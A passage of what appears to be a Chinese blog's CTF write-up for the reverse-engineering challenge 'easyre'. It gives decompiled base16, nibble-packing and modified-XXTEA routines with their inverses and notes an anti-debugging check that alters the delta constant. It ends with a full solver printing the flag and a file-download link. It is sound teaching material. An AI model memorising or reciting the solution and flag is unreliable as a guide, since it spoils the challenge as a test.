class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><ol><li><p>3 个加密算法和它们相应的逆推算法如下:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">char BASE16_ENC_TAB[] &#x3D; &quot;0123456789ABCDEF&quot;;int reBASE16_ENC_TAB(char in)&#123;    if(in&gt;&#x3D;&#39;0&#39; &amp;&amp; in&lt;&#x3D;&#39;9&#39;)        return in-&#39;0&#39;;    return in-&#39;A&#39;+10;&#125;&#x2F;&#x2F; len &#x3D; 16void F1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i++)&#123;        char v1 &#x3D; (in_s[i] &gt;&gt; 4) &amp; 0xf;        char v2 &#x3D; in_s[i] &amp; 0xf;        out_s[2 * i] &#x3D; BASE16_ENC_TAB[v1];        out_s[2 * i + 1] &#x3D; BASE16_ENC_TAB[v2];    &#125;&#125;&#x2F;&#x2F; len &#x3D; 32void reF1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i+&#x3D;2)        out_s[i&#x2F;2] &#x3D; (reBASE16_ENC_TAB(in_s[i])&lt;&lt;4)+reBASE16_ENC_TAB(in_s[i+1]);&#125;int find_first_of(char in)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;16;i++)&#123;        if(in &#x3D;&#x3D; v6[i])            return i;    &#125;&#125;void F2(char *in_s, unsigned int *out_n)&#123;    &#x2F;&#x2F; in_s 长度为 32, out_n 长度为 4    for(int i&#x3D;0;i&lt;32;i+&#x3D;8)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            int v2 &#x3D; find_first_of(in_s[i+j]);            out_n[i &#x2F; 8] |&#x3D; v2 &lt;&lt; (4 * (7 - j));        &#125;    &#125;&#125;void reF2(unsigned int *in_n, char *out_s)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;4;i++)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            out_s[i*8+j] &#x3D; v6[(in_n[i] &gt;&gt; (4 * (7 - j))) &amp; 0xf];        &#125;    &#125;&#125;void F3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; 0;    z &#x3D; v[n - 1];    do    &#123;        sum +&#x3D; DELTA;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; 0; n - 1 &gt; p; ++p )        &#123;            y &#x3D; v[p + 1];            z &#x3D; v[p] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        y &#x3D; v[0];        z &#x3D; v[n-1] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        --rounds;    &#125;    while ( rounds );&#125;void reF3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; rounds*DELTA;    y &#x3D; v[0];    do    &#123;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; n-1; p&gt;0; --p )        &#123;            z &#x3D; v[p-1];            y &#x3D; v[p] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        z &#x3D; v[n-1];        y &#x3D; v[0] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        sum -&#x3D; DELTA;        --rounds;    &#125;    while ( rounds );&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个陷阱就是 XXTEA 第一次执行之前, delta 的值被修改了:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">__int64 vary(void)&#123;  struct _STARTUPINFOA StartupInfo; &#x2F;&#x2F; [rsp+20h] [rbp-70h] BYREF  GetStartupInfoA(&amp;StartupInfo);  StartupInfo.cb &#x3D; 68;  if ( StartupInfo.dwX    || StartupInfo.dwY    || StartupInfo.dwXCountChars    || StartupInfo.dwYCountChars    || StartupInfo.dwXSize    || StartupInfo.dwYSize )  &#123;    DELTA &#x3D; 1061774306;  &#125;  return 0i64;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在最后还有一段 C++:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">std::ostringstream::basic_ostringstream(v11, 16i64);std::allocator&lt;char&gt;::allocator(&amp;v13);std::string::string(v12, &amp;unk_491000, &amp;v13);std::allocator&lt;char&gt;::~allocator(&amp;v13);std::allocator&lt;char&gt;::allocator(&amp;v14);std::string::string(v7, &quot;657402099&quot;, &amp;v14);std::allocator&lt;char&gt;::~allocator(&amp;v14);std::allocator&lt;char&gt;::allocator(&amp;v15);std::string::string(&amp;v8, &quot;6574020991321455863&quot;, &amp;v15);std::allocator&lt;char&gt;::~allocator(&amp;v15);std::allocator&lt;char&gt;::allocator(&amp;v16);std::string::string(&amp;v9, &quot;65740209913214558633720287476&quot;, &amp;v16);std::allocator&lt;char&gt;::~allocator(&amp;v16);std::allocator&lt;char&gt;::allocator(&amp;v17);std::string::string(&amp;v10, &quot;657402099132145586337202874761402167217&quot;, &amp;v17);std::allocator&lt;char&gt;::~allocator(&amp;v17);v22 &#x3D; 0;for ( j &#x3D; 0; j &lt;&#x3D; 3; ++j )&#123;    a1[j] ^&#x3D; a1[(j + 1) % 4];    std::ostream::operator&lt;&lt;(v11, a1[j]);    std::ostringstream::str((std::string *)v18, v7[0], v8);    std::string::operator&#x3D;(v12, v18);    std::string::~string((std::string *)v18);    if ( (unsigned int)std::string::compare((std::string *)v12, (const std::string *)&amp;v7[2 * j]) )        break;    v22 &#x3D; 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概意思应该是这样:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">ostringstream v11;string v7[4];v7[0] &#x3D; &quot;657402099&quot;;v7[1] &#x3D; &quot;6574020991321455863&quot;;v7[2] &#x3D; &quot;65740209913214558633720287476&quot;;v7[3] &#x3D; &quot;657402099132145586337202874761402167217&quot;;ostringstream v11;for (int i &#x3D; 0; i &lt;&#x3D; 3; ++i )&#123;    v[i] ^&#x3D; v[(i + 1) % 4];    v11 &lt;&lt; v[i];    string v12 &#x3D; v11.str();    if(v12.compare(v7[i]))&#123;        puts(&quot;no&quot;);    &#125;&#125;puts(&quot;yes&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求解一下 XXTEA 出来的 4 个数</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">&#x2F;*    v[0] ^&#x3D; v[1];   657402099       0,1    v[1] ^&#x3D; v[2];   1321455863      1,2    v[2] ^&#x3D; v[3];   3720287476      2,3    v[3] ^&#x3D; v[0];   1402167217      3,0,1    v[3] &#x3D; v[3]^v[0];    v[2] &#x3D; v[2]^v[3];    v[1] &#x3D; v[1]^v[2];    v[0] &#x3D; v[0]^v[1];*&#x2F;uint32_t v[4] &#x3D; &#123;657402099,1321455863,3720287476,1402167217&#125;;v[3] &#x3D; v[3]^v[0];v[2] &#x3D; v[2]^v[3];v[1] &#x3D; v[1]^v[2];v[0] &#x3D; v[0]^v[1];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>EXP</strong></p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;char BASE16_ENC_TAB[] &#x3D; &quot;0123456789ABCDEF&quot;;int reBASE16_ENC_TAB(char in)&#123;    if(in&gt;&#x3D;&#39;0&#39; &amp;&amp; in&lt;&#x3D;&#39;9&#39;)        return in-&#39;0&#39;;    return in-&#39;A&#39;+10;&#125;&#x2F;&#x2F; len &#x3D; 16void F1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i++)&#123;        char v1 &#x3D; (in_s[i] &gt;&gt; 4) &amp; 0xf;        char v2 &#x3D; in_s[i] &amp; 0xf;        out_s[2 * i] &#x3D; BASE16_ENC_TAB[v1];        out_s[2 * i + 1] &#x3D; BASE16_ENC_TAB[v2];    &#125;&#125;&#x2F;&#x2F; len &#x3D; 32void reF1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i+&#x3D;2)        out_s[i&#x2F;2] &#x3D; (reBASE16_ENC_TAB(in_s[i])&lt;&lt;4)+reBASE16_ENC_TAB(in_s[i+1]);&#125;bool check1()&#123;    char in[50] &#x3D; &quot;0123456789abcdef&quot;;    char out1[50];    memset(out1,0,sizeof(out1));    F1(in, 16, out1);    char out2[50];    memset(out2,0,sizeof(out2));    reF1(out1, 32, out2);    printf(&quot;%s\n&quot;, out2);&#125;int find_first_of(char in)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;16;i++)&#123;        if(in &#x3D;&#x3D; v6[i])            return i;    &#125;&#125;void F2(char *in_s, unsigned int *out_n)&#123;    &#x2F;&#x2F; in_s 长度为 32, out_n 长度为 4    for(int i&#x3D;0;i&lt;32;i+&#x3D;8)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            int v2 &#x3D; find_first_of(in_s[i+j]);            out_n[i &#x2F; 8] |&#x3D; v2 &lt;&lt; (4 * (7 - j));        &#125;    &#125;&#125;void reF2(unsigned int *in_n, char *out_s)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;4;i++)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            out_s[i*8+j] &#x3D; v6[(in_n[i] &gt;&gt; (4 * (7 - j))) &amp; 0xf];        &#125;    &#125;&#125;bool check2()&#123;    puts(&quot;check2&quot;);    char in[50] &#x3D; &quot;CAEA1116A622787C23D1E7AFFA163F5E&quot;;    unsigned int out1[50];    memset(out1,0,sizeof(out1));    F2(in, out1);    char out2[50];    memset(out2,0,sizeof(out2));    reF2(out1, out2);    printf(&quot;%s\n&quot;, out2);&#125;void F3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; 0;    z &#x3D; v[n - 1];    do    &#123;        sum +&#x3D; DELTA;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; 0; n - 1 &gt; p; ++p )        &#123;            y &#x3D; v[p + 1];            z &#x3D; v[p] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        y &#x3D; v[0];        z &#x3D; v[n-1] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        --rounds;    &#125;    while ( rounds );&#125;void reF3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; rounds*DELTA;    y &#x3D; v[0];    do    &#123;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; n-1; p&gt;0; --p )        &#123;            z &#x3D; v[p-1];            y &#x3D; v[p] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        z &#x3D; v[n-1];        y &#x3D; v[0] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        sum -&#x3D; DELTA;        --rounds;    &#125;    while ( rounds );&#125;void check3()&#123;    puts(&quot;check3&quot;);    uint32_t v[4] &#x3D; &#123;123,34,56,123&#125;;    F3(v, 4);    reF3(v,4);    for(int i&#x3D;0;i&lt;4;i++)        printf(&quot;%d\n&quot;, v[i]);&#125;int main()&#123;    char out1[50];    char out2[50];    memset(out1,0,sizeof(out1));    memset(out2,0,sizeof(out2));    &#x2F;*        v[0] ^&#x3D; v[1];   657402099       0,1        v[1] ^&#x3D; v[2];   1321455863      1,2        v[2] ^&#x3D; v[3];   3720287476      2,3        v[3] ^&#x3D; v[0];   1402167217      3,0,1        v[3] &#x3D; v[3]^v[0];        v[2] &#x3D; v[2]^v[3];        v[1] &#x3D; v[1]^v[2];        v[0] &#x3D; v[0]^v[1];    *&#x2F;    uint32_t v[4] &#x3D; &#123;657402099,1321455863,3720287476,1402167217&#125;;    v[3] &#x3D; v[3]^v[0];    v[2] &#x3D; v[2]^v[3];    v[1] &#x3D; v[1]^v[2];    v[0] &#x3D; v[0]^v[1];    for(int i&#x3D;0;i&lt;4;i++)&#123;        printf(&quot;%u\n&quot;, v[i]);    &#125;    reF3(v, 4);    reF2(v, out1);    reF1(out1, 32, out2);    &#x2F;&#x2F; Y0u_@r3_S0_G0od!    printf(&quot;%s\n&quot;, out2);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><pre class="line-numbers language-none"><code class="language-none">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1REyjdM7WjojMW3sSwdzLAw 提取码：pyzq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
